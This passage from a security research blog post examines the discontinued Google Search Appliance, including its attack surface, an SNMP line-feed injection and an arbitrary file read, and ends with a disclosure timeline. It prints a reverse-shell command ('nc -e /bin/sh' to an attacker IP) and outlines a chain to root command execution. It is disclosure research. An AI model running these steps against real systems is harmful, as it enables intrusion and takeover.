+<span class="nt">-A</span> INPUT <span class="nt">-i</span> eth0 <span class="nt">-p</span> tcp <span class="nt">-m</span> tcp <span class="nt">--dport</span> 8443 <span class="nt">-j</span> ACCEPT
+<span class="nt">-A</span> INPUT <span class="nt">-i</span> eth0 <span class="nt">-p</span> tcp <span class="nt">-m</span> tcp <span class="nt">--dport</span> 9941 <span class="nt">-j</span> ACCEPT
+<span class="nt">-A</span> INPUT <span class="nt">-i</span> eth0 <span class="nt">-p</span> tcp <span class="nt">-m</span> tcp <span class="nt">--dport</span> 9942 <span class="nt">-j</span> ACCEPT
+<span class="nt">-A</span> INPUT <span class="nt">-i</span> eth0 <span class="nt">-p</span> tcp <span class="nt">-m</span> tcp <span class="nt">--dport</span> 10999 <span class="nt">-j</span> ACCEPT
+<span class="nt">-A</span> OUTPUT <span class="nt">-o</span> eth0 <span class="nt">-p</span> udp <span class="nt">-m</span> udp <span class="nt">--sport</span> 68 <span class="nt">--dport</span> 67 <span class="nt">-j</span> ACCEPT
+<span class="nt">-A</span> OUTPUT <span class="nt">-o</span> eth0 <span class="nt">-p</span> udp <span class="nt">-m</span> udp <span class="nt">--dport</span> 53 <span class="nt">-j</span> ACCEPT
+<span class="nt">-A</span> OUTPUT <span class="nt">-o</span> eth0 <span class="nt">-p</span> udp <span class="nt">-m</span> udp <span class="nt">--dport</span> 137:138 <span class="nt">-j</span> ACCEPT
+<span class="nt">-A</span> OUTPUT <span class="nt">-o</span> eth0 <span class="nt">-p</span> udp <span class="nt">-m</span> udp <span class="nt">--dport</span> 123 <span class="nt">-j</span> ACCEPT
+<span class="nt">-A</span> OUTPUT <span class="nt">-o</span> eth0 <span class="nt">-p</span> udp <span class="nt">-m</span> udp <span class="nt">--dport</span> 514 <span class="nt">-j</span> ACCEPT
+<span class="nt">-A</span> INPUT <span class="nt">-i</span> eth0 <span class="nt">-p</span> udp <span class="nt">-m</span> udp <span class="nt">--dport</span> 161 <span class="nt">-j</span> ACCEPT
+<span class="nt">-A</span> OUTPUT <span class="nt">-o</span> eth0 <span class="nt">-p</span> udp <span class="nt">-m</span> udp <span class="nt">--sport</span> 161 <span class="nt">-j</span> ACCEPT
+<span class="nt">-A</span> OUTPUT <span class="nt">-o</span> eth0 <span class="nt">-p</span> udp <span class="nt">-m</span> udp <span class="nt">--dport</span> 162 <span class="nt">-j</span> ACCEPT
+</code></pre></div></div>
+
+<p>The following summarizes the actual accessible TCP attack surface:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Port</th>
+      <th>Service</th>
+      <th>Program Location</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td>ssh</td>
+      <td>/usr/sbin/sshd</td>
+    </tr>
+    <tr>
+      <td>7800</td>
+      <td>EnterpriseFrontend</td>
+      <td>/export/hda3/5.2.0/local/google/bin/EnterpriseFrontend.jar</td>
+    </tr>
+    <tr>
+      <td>4430</td>
+      <td>EnterpriseFrontend</td>
+      <td>/export/hda3/5.2.0/local/google/bin/EnterpriseFrontend.jar</td>
+    </tr>
+    <tr>
+      <td>19900</td>
+      <td>feedergate</td>
+      <td>/export/hda3/5.2.0/local/google/bin/feedergate</td>
+    </tr>
+    <tr>
+      <td>8000</td>
+      <td>EnterpriseAdminConsole</td>
+      <td>/export/hda3/5.2.0/local/google/bin/EnterpriseAdminConsole.jar</td>
+    </tr>
+    <tr>
+      <td>8443</td>
+      <td>stunnel</td>
+      <td>/usr/sbin/stunnel</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>And we found that the strings in file <code class="language-plaintext highlighter-rouge">/export/hda3/versionmanager/google_key.symmetric</code> can be used to decrypt the content of all install bundles! 
+After gaining privileges using CVE-2014-6271 and decrypting the contents of the install bundle, 
+our research on vGSA has temporarily concluded.</p>
+
+<p>But its lacks of memory protection might have some vulnerabilities that can be easily exploited.</p>
+
+<p><img src="/assets/img/blog/20230707/6.png" alt="" /></p>
+
+<h3 id="gsa">GSA</h3>
+
+<p>Upon booting the installed appliance and attempting to change the boot sequence,
+we found that a password is required to enter the BIOS. 
+Moreover, only some functions are accessible in the management interface of the Dell H700 RAID card:</p>
+
+<p><img src="/assets/img/blog/20230707/7.png" alt="" /></p>
+
+<p>Next, attempt to directly read the contents of the hard drive. 
+If the hard drive content is not encrypted, there is a chance that the device’s operating system and software can be obtained directly.
+We found that its hard drive uses SAS interface for transmission. 
+Before attempting, it is necessary to purchase a SAS HBA card. The LSI 9211-8i is used for connection in this test:</p>
+
+<p><img src="/assets/img/blog/20230707/8.png" alt="" /></p>
+
+<p>After connecting and attempting to read, it was discovered that this is a Self-Encrypting Drive (SED). 
+It requires a password to unlock for access. OSSLab has a more detailed explanation here:</p>
+
+<p><a href="https://www.osslab.com.tw/ata-sed-security/">https://www.osslab.com.tw/ata-sed-security/</a> (chinese article)</p>
+
+<p>There are several ways to continue trying when the hard drive cannot be directly accessed:</p>
+
+<ul>
+  <li>Try to read the password in the BIOS EEPROM and change the boot order.</li>
+</ul>
+
+<p>This method requires damage to the motherboard and carries some risk. 
+This method is only used when no vulnerabilities can be found at the software level.
+More information: <a href="https://blog.cybercx.co.nz/bypassing-bios-password">https://blog.cybercx.co.nz/bypassing-bios-password</a></p>
+
+<ul>
+  <li>Use PCILeech to read, write memory to gain system privileges.</li>
+</ul>
+
+<p>This method requires specific PCI-e devices, which were not prepared at the time. You can refer to this GitHub project：</p>
+
+<p><a href="https://github.com/ufrisk/pcileech">https://github.com/ufrisk/pcileech</a></p>
+
+<ul>
+  <li>Look for software vulnerabilities that can access the service</li>
+</ul>
+
+<p>This method is simpler and more feasible.</p>
+
+<h4 id="lf-injection-in-admin-console">LF injection in Admin Console</h4>
+
+<p>After logging into the admin console, 
+we observed a feature for obtaining system information through SNMP.
+Additionally, this feature allows the insertion of custom strings.：</p>
+
+<p><img src="/assets/img/blog/20230707/9.png" alt="" /></p>
+
+<p>We tried classic LF injection here：</p>
+
+<p><img src="/assets/img/blog/20230707/10.png" alt="" /></p>
+
+<p>Inject <code class="language-plaintext highlighter-rouge">sysContact</code> with a LF and following command:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>extend shell /bin/nc -e /bin/sh 10.5.2.1 4444
+</code></pre></div></div>
+
+<p>After inserting the configuration value “extend”, 
+we can use the command “snmpwalk” to trigger the SNMP’s extend functionality and execute a shell.</p>
+
+<p><img src="/assets/img/blog/20230707/11.png" alt="" /></p>
+
+<p>Command executed successfully, and connected back with a shell.</p>
+
+<h4 id="arbitrary-file-reading">Arbitrary File Reading</h4>
+
+<p>From GSA 6.x series versions, we found that the 80/443 web services use Apache httpd in the RPM installation package. 
+There are several http configurations located in /etc/httpd/conf.d/. 
+In the files gsa-http.conf and gsaa-https.conf, certain directories are redirected to specific local services.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  RewriteEngine on
+  RewriteRule ^/security-manager/(.*) http://localhost:7886/security-manager/$1 [P,L]
+  RewriteRule ^/d██████████/(.*) http://localhost:7890/dps/d██████████/$1 [P,L]
+  RewriteRule ^/s██████/(.*) http://localhost:7890/dps/s██████/$1 [P,L]
+  RewriteRule ^/v█████/(.*) http://localhost:7890/v█████/$1 [P,L]
+  RewriteRule ^/$ http://localhost:7800/ [P,L]
+  RewriteRule ^/(.*) http://localhost:7800/$1 [P,L]
+</code></pre></div></div>
+
+<p>The communication ports 7886 and 7890 are services run by separate Apache Tomcat servers. 
+When proxying two or more web servers, the path determination of Tomcat, ..;/, 
+is an interesting test point. You can refer to the article written by our employee for more details:</p>
+
+<p><a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf">https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf</a></p>
+
+<p>The point we’re interested in is <code class="language-plaintext highlighter-rouge">dps</code>, which doesn’t seem to be present in the old version of GSA. 
+Extracting /WEB-INF/web.xml from dps.war allows us to inspect the web application configuration, and we’ve found that the endpoint of /font will handled by
+<code class="language-plaintext highlighter-rouge">com.documill.dps.connector.servlet.user.DPSDownloadServlet</code></p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nt">&lt;servlet&gt;</span>
+    <span class="nt">&lt;servlet-name&gt;</span>font<span class="nt">&lt;/servlet-name&gt;</span>
+    <span class="nt">&lt;servlet-class&gt;</span>com.documill.dps.connector.servlet.user.DPSDownloadServlet<span class="nt">&lt;/servlet-class&gt;</span>
+    <span class="nt">&lt;init-param&gt;</span>
+      <span class="nt">&lt;param-name&gt;</span>rootDirectory<span class="nt">&lt;/param-name&gt;</span>
+      <span class="nt">&lt;param-value&gt;</span>work/fonts/<span class="nt">&lt;/param-value&gt;</span>
+    <span class="nt">&lt;/init-param&gt;</span>
+  <span class="nt">&lt;/servlet&gt;</span>
+
+  <span class="nt">&lt;servlet-mapping&gt;</span>
+    <span class="nt">&lt;servlet-name&gt;</span>font<span class="nt">&lt;/servlet-name&gt;</span>
+    <span class="nt">&lt;url-pattern&gt;</span>/font/*<span class="nt">&lt;/url-pattern&gt;</span>
+  <span class="nt">&lt;/servlet-mapping&gt;</span>
+</code></pre></div></div>
+
+<p>And looking into <code class="language-plaintext highlighter-rouge">DPSDownloadServlet</code>：</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">com.davisor.net.servlet.DownloadServlet</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.documill.dps.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.servlet.ServletContext</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">DPSDownloadServlet</span> <span class="kd">extends</span> <span class="nc">DownloadServlet</span>
+    <span class="kd">implements</span> <span class="nc">DPSUserService</span>
+<span class="o">{</span>
+
+    <span class="kd">public</span> <span class="nf">DPSDownloadServlet</span><span class="o">()</span>
+    <span class="o">{</span>
+    <span class="o">}</span>
+
+    <span class="kd">protected</span> <span class="nc">String</span> <span class="nf">getRealPath</span><span class="o">(</span><span class="nc">ServletContext</span> <span class="n">servletcontext</span><span class="o">,</span> <span class="nc">String</span> <span class="n">s</span><span class="o">)</span>
+        <span class="kd">throws</span> <span class="nc">IOException</span>
+    <span class="o">{</span>
+        <span class="no">DPS</span> <span class="n">dps</span> <span class="o">=</span> <span class="nc">DPSSingleton</span><span class="o">.</span><span class="na">getDPS</span><span class="o">();</span>
+        <span class="nc">File</span> <span class="n">file</span> <span class="o">=</span> <span class="n">dps</span><span class="o">.</span><span class="na">getHomeDir</span><span class="o">();</span>
+        <span class="k">if</span><span class="o">(</span><span class="n">file</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="nf">FileNotFoundException</span><span class="o">(</span><span class="s">"DPSDownloadServlet:getRealPath:DPS home directory not specified"</span><span class="o">);</span>
+        <span class="k">else</span>
+            <span class="nf">return</span> <span class="o">(</span><span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">file</span><span class="o">,</span> <span class="n">s</span><span class="o">)).</span><span class="na">getAbsolutePath</span><span class="o">();</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">long</span> <span class="n">serialVersionUID</span> <span class="o">=</span> <span class="mi">0L</span><span class="o">;</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>Step into <code class="language-plaintext highlighter-rouge">com.davisor.net.servlet.DownloadServlet</code> which extends <code class="language-plaintext highlighter-rouge">DPSDownloadServlet</code>：</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">service</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">httpservletrequest</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">httpservletresponse</span><span class="o">)</span>
+        <span class="kd">throws</span> <span class="nc">ServletException</span><span class="o">,</span> <span class="nc">IOException</span>
+    <span class="o">{</span>
+        <span class="nc">String</span> <span class="n">s</span> <span class="o">=</span> <span class="n">httpservletrequest</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="n">uriParameterName</span><span class="o">);</span>
+        <span class="k">if</span><span class="o">(!</span><span class="n">isValid</span><span class="o">(</span><span class="n">s</span><span class="o">))</span>
+        <span class="o">{</span>
+            <span class="n">httpservletresponse</span><span class="o">.</span><span class="na">sendError</span><span class="o">(</span><span class="mi">400</span><span class="o">,</span> <span class="o">(</span><span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">()).</span><span class="na">append</span><span class="o">(</span><span class="s">"Invalid file path: "</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="n">s</span><span class="o">).</span><span class="na">toString</span><span class="o">());</span>
+            <span class="k">return</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="nc">File</span> <span class="n">file</span> <span class="o">=</span> <span class="n">rootDirectory</span><span class="o">.</span><span class="na">deriveFile</span><span class="o">(</span><span class="n">s</span><span class="o">);</span>
+        <span class="k">if</span><span class="o">(!</span><span class="n">file</span><span class="o">.</span><span class="na">isFile</span><span class="o">())</span>
+            <span class="n">httpservletresponse</span><span class="o">.</span><span class="na">sendError</span><span class="o">(</span><span class="mi">404</span><span class="o">,</span> <span class="o">(</span><span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">()).</span><span class="na">append</span><span class="o">(</span><span class="s">"No file:"</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="n">s</span><span class="o">).</span><span class="na">toString</span><span class="o">());</span>
+        <span class="k">else</span>
+        <span class="nf">if</span><span class="o">(!</span><span class="n">file</span><span class="o">.</span><span class="na">canRead</span><span class="o">())</span>
+        <span class="o">{</span>
+            <span class="n">httpservletresponse</span><span class="o">.</span><span class="na">sendError</span><span class="o">(</span><span class="mi">403</span><span class="o">,</span> <span class="o">(</span><span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">()).</span><span class="na">append</span><span class="o">(</span><span class="s">"Unreadable file:"</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="n">s</span><span class="o">).</span><span class="na">toString</span><span class="o">());</span>
+        <span class="o">}</span> <span class="k">else</span>
+        <span class="o">{</span>
+            <span class="kt">long</span> <span class="n">l</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="na">length</span><span class="o">();</span>
+            <span class="k">if</span><span class="o">(</span><span class="n">l</span> <span class="o">&gt;</span> <span class="mh">0x7fffffff</span><span class="no">L</span><span class="o">)</span>
+            <span class="o">{</span>
+                <span class="n">httpservletresponse</span><span class="o">.</span><span class="na">sendError</span><span class="o">(</span><span class="mi">413</span><span class="o">,</span> <span class="o">(</span><span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">()).</span><span class="na">append</span><span class="o">(</span><span class="s">"File too big:"</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="n">l</span><span class="o">).</span><span class="na">toString</span><span class="o">());</span>
+            <span class="o">}</span> <span class="k">else</span>
+            <span class="o">{</span>
+                <span class="nc">String</span> <span class="n">s1</span> <span class="o">=</span> <span class="no">MIME</span><span class="o">.</span><span class="na">getTypeFromPath</span><span class="o">(</span><span class="n">file</span><span class="o">.</span><span class="na">getName</span><span class="o">(),</span> <span class="s">"application/octet-stream"</span><span class="o">);</span>
+                <span class="n">httpservletresponse</span><span class="o">.</span><span class="na">setContentLength</span><span class="o">((</span><span class="kt">int</span><span class="o">)</span><span class="n">l</span><span class="o">);</span>
+                <span class="n">httpservletresponse</span><span class="o">.</span><span class="na">setContentType</span><span class="o">(</span><span class="n">s1</span><span class="o">);</span>
+                <span class="n">httpservletresponse</span><span class="o">.</span><span class="na">setDateHeader</span><span class="o">(</span><span class="s">"Last-Modified"</span><span class="o">,</span> <span class="n">file</span><span class="o">.</span><span class="na">lastModified</span><span class="o">());</span>
+                <span class="k">if</span><span class="o">(</span><span class="n">cacheExpires</span> <span class="o">&gt;</span> <span class="mi">0L</span><span class="o">)</span>
+                <span class="o">{</span>
+                    <span class="n">httpservletresponse</span><span class="o">.</span><span class="na">setDateHeader</span><span class="o">(</span><span class="s">"Expires"</span><span class="o">,</span> <span class="nc">System</span><span class="o">.</span><span class="na">currentTimeMillis</span><span class="o">()</span> <span class="o">+</span> <span class="n">cacheExpires</span><span class="o">);</span>
+                    <span class="n">httpservletresponse</span><span class="o">.</span><span class="na">setHeader</span><span class="o">(</span><span class="s">"Cache-Control"</span><span class="o">,</span> <span class="s">"public"</span><span class="o">);</span>
+                <span class="o">}</span>
+                <span class="no">IO</span><span class="o">.</span><span class="na">copy</span><span class="o">(</span><span class="n">file</span><span class="o">,</span> <span class="n">httpservletresponse</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">());</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kt">boolean</span> <span class="nf">isValid</span><span class="o">(</span><span class="nc">String</span> <span class="n">s</span><span class="o">)</span>
+    <span class="o">{</span>
+        <span class="k">return</span> <span class="o">!</span><span class="nc">Strings</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">(</span><span class="n">s</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">s</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="s">".."</span><span class="o">);</span>
+    <span class="o">}</span>
+</code></pre></div></div>
+
+<p>You can see here that the only check is whether the string contains <code class="language-plaintext highlighter-rouge">..</code>. 
+However, we can directly specify the absolute path and read any local file directly!</p>
+
+<p><img src="/assets/img/blog/20230707/12.png" alt="" /></p>
+
+<p>The old version of GSA does not have the /font endpoint, 
+but /dps/admin/admin has a similar file reading issue. 
+You can directly specify the logName for file reading. 
+Refer to the diagram below for directly reading the account password from the system management interface:</p>
+
+<p><img src="/assets/img/blog/20230707/13.png" alt="" /></p>
+
+<p>After successfully cracking the hash, you can log in, enable the SNMP service, 
+and combine it with the first vulnerability to execute arbitrary commands with root privileges.</p>
+
+<h3 id="other-findings-and-misc">Other findings and misc</h3>
+
+<h4 id="internal-uris-in-web-services">Internal URIs in web services</h4>
+
+<p>In GSA, there are multiple sub-services that communicate with each other using the HTTP protocol. 
+Many of these services offer URLs such as /varz, /helpz, and /procz. 
+We can access them either in the trusted network location defined for the service or using 127.0.0.1:</p>
+
+<p><img src="/assets/img/blog/20230707/14.png" alt="" /></p>
+
+<p>In vGSA, we observed that there is a service execution parameter called “useripheader=X-User-Ip”, 
+this parameter allows direct access to a certain functionality of the externally exposed admin console when 
+included in the request header as “X-User-Ip”.</p>
+
+<p><img src="/assets/img/blog/20230707/15.png" alt="" /></p>
+
+<p><img src="/assets/img/blog/20230707/16.png" alt="" /></p>
+
+<p>The <code class="language-plaintext highlighter-rouge">/procz</code> endpoint can even fetch executables and the shared libraries they are using:</p>
+
+<p><img src="/assets/img/blog/20230707/17.png" alt="" /></p>
+
+<h4 id="appliances-list">Appliances list</h4>
+
+<table>
+  <thead>
+    <tr>
+      <th>Model name</th>
+      <th>Maker</th>
+      <th>Specs</th>
+      <th>version</th>
+      <th>Document amount</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Google Mini</td>
+      <td>Gigabyte</td>
+      <td><a href="https://commons.erau.edu/cgi/viewcontent.cgi?article=1153&amp;context=jdfsl">Pentium III 1G / 2GB memory / 120G</a></td>
+      <td>3.4.14</td>
+      <td>300,000</td>
+    </tr>
+    <tr>
+      <td>Google Mini-002X</td>
+      <td>SuperMicro</td>
+      <td>Pentium 4 3G / 2GB memory / 250G HDD</td>
+      <td>5.0.0</td>
+      <td>unknown</td>
+    </tr>
+    <tr>
+      <td>Google GB-1001</td>
+      <td>Dell Poweredge 2950</td>
+      <td>Xeon / 16GB memory / 1.25TB HDD</td>
+      <td>unknown</td>
+      <td>3,000,000</td>
+    </tr>
+    <tr>
+      <td>Google GB-1002</td>
+      <td>Gigabyte</td>
+      <td>unknown</td>
+      <td>unknown</td>
+      <td>unknown</td>
+    </tr>
+    <tr>
+      <td>Google GB-7007</td>
+      <td>Dell R710</td>
+      <td>Xeon E5520 / 48GB memory / 3TB HDD</td>
+      <td>unknown</td>
+      <td>10,000,000</td>
+    </tr>
+    <tr>
+      <td>Google GB-9009</td>
+      <td>Dell unknown</td>
+      <td>Xeon X5560 / 96GB memory / 3.6TB HDD</td>
+      <td>unknown</td>
+      <td>30,000,000</td>
+    </tr>
+    <tr>
+      <td>Google G100</td>
+      <td>Dell R720XD</td>
+      <td>unknown</td>
+      <td>unknown</td>
+      <td>unknown</td>
+    </tr>
+  </tbody>
+</table>
+
+<h4 id="linux-kernel-version">Linux Kernel Version</h4>
+
+<table>
+  <thead>
+    <tr>
+      <th>GSA version</th>
+      <th>Linux Kernel Version</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>7.6.0</td>
+      <td>Linux version 3.14.44_gsa-x64_1.5 (mrevutskyi@mrevutskyi.mtv.corp.google.com) (gcc version 4.9.x-google 20150123 (prerelease) (Google_crosstoolv18-gcc-4.9.x-x86_64-grtev4-linux-gnu) ) #1 SMP Mon Nov 23 09:19:11 PST 2015</td>
+    </tr>
+    <tr>
+      <td>7.4.0</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>7.2.0</td>
+      <td>Linux version 3.4.3_gsa-x64_1.5 (martincochran@ypc-ubiq202.dls.corp.google.com) (gcc version 4.6.x-google 20120601 (prerelease) (Google_crosstoolv15-gcc-4.6.x-glibc-2.11.1-grte) ) #1 SMP Tue Jul 9 15:36:01 PDT 2013</td>
+    </tr>
+    <tr>
+      <td>7.0.14</td>
+      <td>Linux version 3.4.3_gsa-x64_1.3 (stephenamar@neutrino.mtv.corp.google.com) (gcc version 4.6.x-google 20120601 (prerelease) (Google_crosstoolv15-gcc-4.6.x-glibc-2.11.1-grte) ) #1 SMP Thu Jul 19 11:59:57 PDT 2012</td>
+    </tr>
+    <tr>
+      <td>5.2.0</td>
+      <td>Linux version 2.6.20_vmw-smp_3.1 (yifeng@yifeng.corp.google.com) (gcc version 4.1.1) #1 SMP Thu Jan 24 22:34:28 PST 2008</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="timeline">Timeline</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>時間</th>
+      <th>事件</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>2005/06/10</td>
+      <td>Java Code Injection <a href="https://seclists.org/fulldisclosure/2005/Nov/652">CVE-2005-3757</a> reported by H D Moore</td>
+    </tr>
+    <tr>
+      <td>early 2008</td>
+      <td>GSA 5.0 released</td>
+    </tr>
+    <tr>
+      <td>2008/10/28</td>
+      <td>vgsa_20081028.7z (5.2.0)  released</td>
+    </tr>
+    <tr>
+      <td>2013/04/20</td>
+      <td>GSA 6.14.0.G28  released</td>
+    </tr>
+    <tr>
+      <td>2014/03/20</td>
+      <td>Cross-site Scripting <a href="https://latesthackingnews.com/2014/05/03/xss-vulnerability-found-in-google-search-appliance/">CVE-2014-0362</a> reported by Will Dormann</td>
+    </tr>
+    <tr>
+      <td>2014/10/01</td>
+      <td>GSA 7.0.14.G238 released</td>
+    </tr>
+    <tr>
+      <td>2014/10/03</td>
+      <td>GSA 7.2.0.G252 released</td>
+    </tr>
+    <tr>
+      <td>2014/12/12</td>
+      <td>GSA 7.2.0.G264 released</td>
+    </tr>
+    <tr>
+      <td>2015/02/07</td>
+      <td>GSA 7.2.0.G270 released</td>
+    </tr>
+    <tr>
+      <td>2015/04/15</td>
+      <td>GSA 7.4.0.G64 released</td>
+    </tr>
+    <tr>
+      <td>2015/04/22</td>
+      <td>GSA 7.4.0.G72 released</td>
+    </tr>
+    <tr>
+      <td>2015/04/30</td>
+      <td>GSA 7.4.0.G74 released</td>
+    </tr>
+    <tr>
+      <td>2015/06/04</td>
+      <td>GSA 7.4.0.G82 released</td>
+    </tr>
+    <tr>
+      <td>early 2016</td>
+      <td>Google announced that GSA will be sunset from the market.</td>
+    </tr>
+    <tr>
+      <td>2016/01/05</td>
+      <td>XML External Entitiy injection <a href="https://insinuator.net/2016/03/classical-web-vulns-found-in-google-search-appliance-7-4/"></a> reported by Timo</td>
+    </tr>
+    <tr>
+      <td>2016/05/24</td>
+      <td>GSA 7.6.0.G36 released</td>
+    </tr>
+    <tr>
+      <td>2016/07/01</td>
+      <td>GSA 7.6.0.G42 released</td>
+    </tr>
+    <tr>
+      <td>2016/07/31</td>
+      <td>The author of this article obtained this device, with the version being 7.0.14</td>
+    </tr>
+    <tr>
+      <td>2016/08/25</td>
+      <td>GSA 7.6.0.G46 released</td>
+    </tr>
+    <tr>
+      <td>2016/10/21</td>
+      <td>GSA 7.6.0.G58 released</td>
+    </tr>
+    <tr>
+      <td>2017/01/19</td>
+      <td>GSA 7.6.50.G30 released</td>
+    </tr>
+    <tr>
+      <td>2017/04/19</td>
+      <td>GSA 7.6.50.G36 released</td>
+    </tr>
+    <tr>
+      <td>2017/07/28</td>
+      <td>GSA 7.6.50.G64 released</td>
+    </tr>
+    <tr>
+      <td>2017/11/09</td>
+      <td>GSA 7.6.250.G12 released</td>
+    </tr>
+    <tr>
+      <td>2017/12/28</td>
+      <td>The final date to order GSA.</td>
+    </tr>
+    <tr>
+      <td>2018/01/17</td>
+      <td>GSA 7.6.250.G20 released</td>
+    </tr>
+    <tr>
+      <td>2018/03/21</td>
+      <td>GSA 7.6.250.G26 released</td>
+    </tr>
+    <tr>
+      <td>2018/06/15</td>
+      <td>GSA 7.6.360.G10 released</td>
+    </tr>
+    <tr>
+      <td>2018/10/08</td>
+      <td>GSA 7.6.360.G16 released</td>
+    </tr>
+    <tr>
+      <td>2019/04/26</td>
+      <td>GSA 7.6.512.G18 released. It should be the last publicly released version.</td>
+    </tr>
+    <tr>
+      <td>2021/08/16</td>
+      <td>issues reported.</td>
+    </tr>
+    <tr>
+      <td>2021/08/16</td>
+      <td>replied from a bot, and triaged.</td>
+    </tr>
+    <tr>
+      <td>2021/08/16</td>
+      <td>issuetracker.google.com assigned a issue.</td>
+    </tr>
+    <tr>
+      <td>2021/08/18</td>
+      <td>Google said issue is not severe enough to qualify for a reward, but VRP panel will take a closer look.</td>
+    </tr>
+    <tr>
+      <td>2021/08/20</td>
+      <td>VRP panel has decided that the security impact of this issue does not meet the bar for a financial reward.</td>
+    </tr>
+    <tr>
+      <td>2021/11/01</td>
+      <td>Asking if a vulnerability will be assigned a CVE identifier.</td>
+    </tr>
+    <tr>
+      <td>2021/11/02</td>
+      <td>Confirming that a CVE identifier will not be assigned.</td>
+    </tr>
+    <tr>
+      <td>early 2023</td>
+      <td>Started writing this article</td>
+    </tr>
+    <tr>
+      <td>2023/06/04</td>
+      <td>First draft completed.</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="conclusion">Conclusion</h3>
+
+<p>Although the GSA/vGSA is a product that has reached the end of its lifecycle, 
+studying how Google increases product security and reduces attack vectors for devices can broaden our knowledge,
+which we might not usually come into contact with. 
+Although it is not detailed in this article, the Java Security Manager and the Linux Kernel’s seccomp are both technologies used in the GSA, 
+and this research has also left some goals for further study:</p>
+
+<ul>
+  <li>The feedergate service listening on port 19900.</li>
+  <li>Memory vulnerabilities in Oracle’s Outside-in Technology for converting file formats.</li>
+  <li>The convert_to_html seccomp sandbox</li>
+</ul>
+
+<p>We will share when there are some research results, See you next time.</p>
+
+<h3 id="other-reference-links">Other reference links</h3>
+
+<ul>
+  <li><a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf">https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf</a></li>
+  <li><a href="https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/">https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/</a></li>
+  <li><a href="https://www.exploit-db.com/exploits/1333">https://www.exploit-db.com/exploits/1333</a></li>
+  <li><a href="https://commons.erau.edu/cgi/viewcontent.cgi?article=1153&amp;context=jdfsl">https://commons.erau.edu/cgi/viewcontent.cgi?article=1153&amp;context=jdfsl</a></li>
+  <li><a href="https://www.anandtech.com/show/2407">https://www.anandtech.com/show/2407</a></li>
+  <li><a href="https://groups.google.com/g/google-search-appliance-help/c/Qn5aO5r2Joo/m/PTw8ZDWu6vYJ">https://groups.google.com/g/google-search-appliance-help/c/Qn5aO5r2Joo/m/PTw8ZDWu6vYJ</a></li>
+  <li><a href="https://github.com/google/subpar">https://github.com/google/subpar</a></li>
+  <li><a href="https://insinuator.net/2016/03/classical-web-vulns-found-in-google-search-appliance-7-4/">https://insinuator.net/2016/03/classical-web-vulns-found-in-google-search-appliance-7-4/</a></li>
+  <li><a href="https://github.com/kubernetes/kubernetes/issues/57760#issuecomment-356466614">https://github.com/kubernetes/kubernetes/issues/57760#issuecomment-356466614</a></li>
+  <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2014-0362">https://nvd.nist.gov/vuln/detail/CVE-2014-0362</a></li>
+</ul>
+
+
+                    </div>
+                    <!-- 文章內容 -->
+                </div>
+            </article>
+            <!-- 文章 end -->
+        </section>
+        
+
+    </div>
+
+    <!-- footer -->
+    <footer>
